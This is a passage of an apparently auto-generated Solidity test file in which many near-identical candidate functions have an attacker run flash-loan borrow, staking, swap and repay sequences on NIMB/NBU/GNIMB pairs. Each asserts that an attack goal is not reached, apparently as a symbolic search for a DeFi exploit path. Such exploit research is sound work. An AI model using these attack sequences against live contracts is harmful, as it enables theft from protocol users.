        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
